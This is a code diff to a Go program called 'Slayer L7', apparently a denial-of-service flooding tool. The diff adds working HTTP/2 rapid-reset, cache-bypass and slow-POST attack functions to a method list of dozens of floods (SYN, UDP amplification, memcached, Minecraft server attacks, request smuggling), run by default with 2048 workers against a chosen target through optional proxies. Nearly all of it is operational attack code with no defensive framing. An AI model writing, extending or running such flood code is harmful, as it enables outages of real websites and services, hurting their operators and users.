@@ -6173,6 +6173,213 @@ func httpMixChunkedSlow(targetURL string, client *http.Client, stop <-chan struc
     return nil
 }
 
+func httpRapidResetAdvanced(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        if u.Scheme == "https" {
+            port = "443"
+        } else {
+            port = "80"
+        }
+    }
+    addr := net.JoinHostPort(host, port)
+
+    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    tlsConn := tls.Client(rawConn, &tls.Config{
+        ServerName:         host,
+        NextProtos:         []string{"h2"},
+        InsecureSkipVerify: true,
+    })
+    if err := tlsConn.Handshake(); err != nil {
+        rawConn.Close()
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+    defer tlsConn.Close()
+
+    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return fmt.Errorf("h2 not negotiated")
+    }
+
+    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    bw := bufio.NewWriterSize(tlsConn, 1<<20)
+    framer := http2.NewFramer(bw, tlsConn)
+    framer.AllowIllegalWrites = true
+
+    framer.WriteSettings(
+        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1<<31 - 1},
+        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1<<31 - 1},
+    )
+    bw.Flush()
+
+    var streamID uint32 = 1
+    var hdrBuf bytes.Buffer
+    enc := hpack.NewEncoder(&hdrBuf)
+    path := u.RequestURI()
+    if path == "" {
+        path = "/"
+    }
+
+    for {
+        select {
+        case <-stop:
+            return nil
+        default:
+        }
+
+        hdrBuf.Reset()
+        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
+        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})
+        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
+
+        if err := framer.WriteHeaders(http2.HeadersFrameParam{
+            StreamID:      streamID,
+            BlockFragment: hdrBuf.Bytes(),
+            EndStream:     true,
+            EndHeaders:    true,
+        }); err != nil {
+            return err
+        }
+
+        if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+            return err
+        }
+
+        streamID += 2
+        if streamID >= 1<<31-1 {
+            bw.Flush()
+            return nil
+        }
+
+        if streamID%100 == 0 {
+            bw.Flush()
+        }
+
+        recordStatus("RST")
+        totalSuccess.Add(1)
+    }
+}
+
+func httpCacheBypass(targetURL string, client *http.Client) error {
+    sep := "?"
+    if strings.Contains(targetURL, "?") {
+        sep = "&"
+    }
+    fullURL := targetURL + sep + "v=" + strconv.FormatInt(time.Now().UnixNano(), 10) + "&r=" + randString(32)
+
+    req, err := http.NewRequest("GET", fullURL, nil)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    req.Header.Set("User-Agent", randUA())
+    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+    req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+    req.Header.Set("Pragma", "no-cache")
+
+    resp, err := client.Do(req)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    totalSuccess.Add(1)
+    return nil
+}
+
+type slowPayloadReader struct {
+    size int64
+    sent int64
+    stop <-chan struct{}
+}
+
+func (r *slowPayloadReader) Read(p []byte) (int, error) {
+    select {
+    case <-r.stop:
+        return 0, io.EOF
+    default:
+    }
+
+    if r.sent >= r.size {
+        return 0, io.EOF
+    }
+
+    time.Sleep(500 * time.Millisecond)
+    p[0] = 'A'
+    r.sent++
+    return 1, nil
+}
+
+func httpSlowPostBomb(targetURL string, client *http.Client, stop <-chan struct{}) error {
+    payload := &slowPayloadReader{
+        size: 1 * 1024 * 1024 * 1024,
+        stop: stop,
+    }
+
+    req, err := http.NewRequest("POST", targetURL, payload)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    req.ContentLength = payload.size
+    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+    req.Header.Set("User-Agent", randUA())
+    req.Header.Set("Connection", "keep-alive")
+
+    slowClient := &http.Client{
+        Transport: client.Transport,
+        Timeout:   0,
+    }
+
+    resp, err := slowClient.Do(req)
+    if err != nil {
+        recordStatus("Err")
+        totalErrors.Add(1)
+        return err
+    }
+
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    totalSuccess.Add(1)
+    return nil
+}
+
 func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
     client := clients[id%len(clients)]
     for {
@@ -6380,6 +6587,12 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
             err = httpMixRegex(targetURL, client)
         case "mixchunked":
             err = httpMixChunkedSlow(targetURL, client, stop)
+        case "rapidreset_adv":
+            err = httpRapidResetAdvanced(targetURL, stop)
+        case "cachebypass":
+            err = httpCacheBypass(targetURL, client)
+        case "slowpost_bomb":
+            err = httpSlowPostBomb(targetURL, client, stop)
         default:
             fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
             os.Exit(1)
@@ -6397,7 +6610,7 @@ func Worker(id int, targetURL string, method string, clients []*http.Client, sto
 
 func main() {
     target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood, mc_hold, mc_data, httpoptions, httpdelete, httpput, httphead, xss_probe, sqli_probe, path_traversal, smuggle_tete, dns_query, icmp_flood, ack_flood, syn_flood, mc_ext_login, mc_bungee, mc_varint, mc_ping_var, mc_data_spam, mc_profile_flood, http_empty, http_invalid_req, http_ghost, http_frag, http_header_split, http_ssrf, http_slow_read, http_invalid_hdr, http_rapid_connect, http_auth, http_h2_flood, udp_amp, http_json, http_multipart, http_conn_smuggle, http_long_hdr, http_cache_maxage, http_dead_conn, http_bad_start, http_form_bomb, http_ntlm, mc_account_fill, mc_spam_pkt, mc_bad_pkt, mc_random_pkt, mc_slow_read, tcp_socket_exhaust, dns_nx, udp_dns, udp_memcached, icmp_large, tcp_urg, tcp_oob, tcp_fin, tcp_half_open, tcp_fragmented, tcp_large_connect, http_event_stream, http_poll, http_payload, h2_window, graphql_recursion, h2_cont_bomb, mixheavy, mixbunchof, mixregex, mixchunked")
+    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, tcp_connect, tcp_slow, tcp_payload, udp_flood, mc_ping, mc_bot, mc_bigpacket, mc_legacy, mc_nullping, mc_handshake_flood, mc_hold, mc_data, httpoptions, httpdelete, httpput, httphead, xss_probe, sqli_probe, path_traversal, smuggle_tete, dns_query, icmp_flood, ack_flood, syn_flood, mc_ext_login, mc_bungee, mc_varint, mc_ping_var, mc_data_spam, mc_profile_flood, http_empty, http_invalid_req, http_ghost, http_frag, http_header_split, http_ssrf, http_slow_read, http_invalid_hdr, http_rapid_connect, http_auth, http_h2_flood, udp_amp, http_json, http_multipart, http_conn_smuggle, http_long_hdr, http_cache_maxage, http_dead_conn, http_bad_start, http_form_bomb, http_ntlm, mc_account_fill, mc_spam_pkt, mc_bad_pkt, mc_random_pkt, mc_slow_read, tcp_socket_exhaust, dns_nx, udp_dns, udp_memcached, icmp_large, tcp_urg, tcp_oob, tcp_fin, tcp_half_open, tcp_fragmented, tcp_large_connect, http_event_stream, http_poll, http_payload, h2_window, graphql_recursion, h2_cont_bomb, mixheavy, mixbunchof, mixregex, mixchunked, rapidreset_adv, cachebypass, slowpost_bomb")
     workerCount := flag.Int("w", 2048, "number of workers")
     dur := flag.Int("d", 30, "duration in seconds")
     pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
@@ -6408,7 +6621,7 @@ func main() {
     if *target == "" {
         fmt.Println("Slayer L7")
         fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood | mc_hold | mc_data | httpoptions | httpdelete | httpput | httphead | xss_probe | sqli_probe | path_traversal | smuggle_tete | dns_query | icmp_flood | ack_flood | syn_flood | mc_ext_login | mc_bungee | mc_varint | mc_ping_var | mc_data_spam | mc_profile_flood | http_empty | http_invalid_req | http_ghost | http_frag | http_header_split | http_ssrf | http_slow_read | http_invalid_hdr | http_rapid_connect | http_auth | http_h2_flood | udp_amp | http_json | http_multipart | http_conn_smuggle | http_long_hdr | http_cache_maxage | http_dead_conn | http_bad_start | http_form_bomb | http_ntlm | mc_account_fill | mc_spam_pkt | mc_bad_pkt | mc_random_pkt | mc_slow_read | tcp_socket_exhaust | dns_nx | udp_dns | udp_memcached | icmp_large | tcp_urg | tcp_oob | tcp_fin | tcp_half_open | tcp_fragmented | tcp_large_connect | http_event_stream | http_poll | http_payload | h2_window | graphql_recursion | h2_cont_bomb | mixheavy | mixbunchof | mixregex | mixchunked")
+        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | tcp_connect | tcp_slow | tcp_payload | udp_flood | mc_ping | mc_bot | mc_bigpacket | mc_legacy | mc_nullping | mc_handshake_flood | mc_hold | mc_data | httpoptions | httpdelete | httpput | httphead | xss_probe | sqli_probe | path_traversal | smuggle_tete | dns_query | icmp_flood | ack_flood | syn_flood | mc_ext_login | mc_bungee | mc_varint | mc_ping_var | mc_data_spam | mc_profile_flood | http_empty | http_invalid_req | http_ghost | http_frag | http_header_split | http_ssrf | http_slow_read | http_invalid_hdr | http_rapid_connect | http_auth | http_h2_flood | udp_amp | http_json | http_multipart | http_conn_smuggle | http_long_hdr | http_cache_maxage | http_dead_conn | http_bad_start | http_form_bomb | http_ntlm | mc_account_fill | mc_spam_pkt | mc_bad_pkt | mc_random_pkt | mc_slow_read | tcp_socket_exhaust | dns_nx | udp_dns | udp_memcached | icmp_large | tcp_urg | tcp_oob | tcp_fin | tcp_half_open | tcp_fragmented | tcp_large_connect | http_event_stream | http_poll | http_payload | h2_window | graphql_recursion | h2_cont_bomb | mixheavy | mixbunchof | mixregex | mixchunked | rapidreset_adv | cachebypass | slowpost_bomb")
         fmt.Println()
         flag.PrintDefaults()
         os.Exit(1)
@@ -6438,6 +6651,7 @@ func main() {
         "tcp_fragmented": true, "tcp_large_connect": true, "http_event_stream": true, "http_poll": true, "http_payload": true,
         "h2_window": true, "graphql_recursion": true, "h2_cont_bomb": true,
         "mixheavy": true, "mixbunchof": true, "mixregex": true, "mixchunked": true,
+        "rapidreset_adv": true, "cachebypass": true, "slowpost_bomb": true,
     }
     if !validMethods[strings.ToLower(*method)] {
         fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
@@ -6446,7 +6660,7 @@ func main() {
 
     needsClientPool := true
     switch strings.ToLower(*method) {
-    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood", "mc_hold", "mc_data", "smuggle_tete", "dns_query", "icmp_flood", "ack_flood", "syn_flood", "mc_ext_login", "mc_bungee", "mc_varint", "mc_ping_var", "mc_data_spam", "mc_profile_flood", "http_invalid_req", "http_ghost", "http_frag", "http_invalid_hdr", "http_rapid_connect", "http_h2_flood", "udp_amp", "http_conn_smuggle", "http_long_hdr", "http_bad_start", "mc_account_fill", "mc_spam_pkt", "mc_bad_pkt", "mc_random_pkt", "mc_slow_read", "tcp_socket_exhaust", "dns_nx", "udp_dns", "udp_memcached", "icmp_large", "tcp_urg", "tcp_oob", "tcp_fin", "tcp_half_open", "tcp_fragmented", "tcp_large_connect", "h2_window", "h2_cont_bomb", "mixchunked":
+    case "rapidreset", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "tcp_connect", "tcp_slow", "tcp_payload", "udp_flood", "mc_ping", "mc_bot", "mc_bigpacket", "mc_legacy", "mc_nullping", "mc_handshake_flood", "mc_hold", "mc_data", "smuggle_tete", "dns_query", "icmp_flood", "ack_flood", "syn_flood", "mc_ext_login", "mc_bungee", "mc_varint", "mc_ping_var", "mc_data_spam", "mc_profile_flood", "http_invalid_req", "http_ghost", "http_frag", "http_invalid_hdr", "http_rapid_connect", "http_h2_flood", "udp_amp", "http_conn_smuggle", "http_long_hdr", "http_bad_start", "mc_account_fill", "mc_spam_pkt", "mc_bad_pkt", "mc_random_pkt", "mc_slow_read", "tcp_socket_exhaust", "dns_nx", "udp_dns", "udp_memcached", "icmp_large", "tcp_urg", "tcp_oob", "tcp_fin", "tcp_half_open", "tcp_fragmented", "tcp_large_connect", "h2_window", "h2_cont_bomb", "mixchunked", "rapidreset_adv":
         needsClientPool = false
     }
 
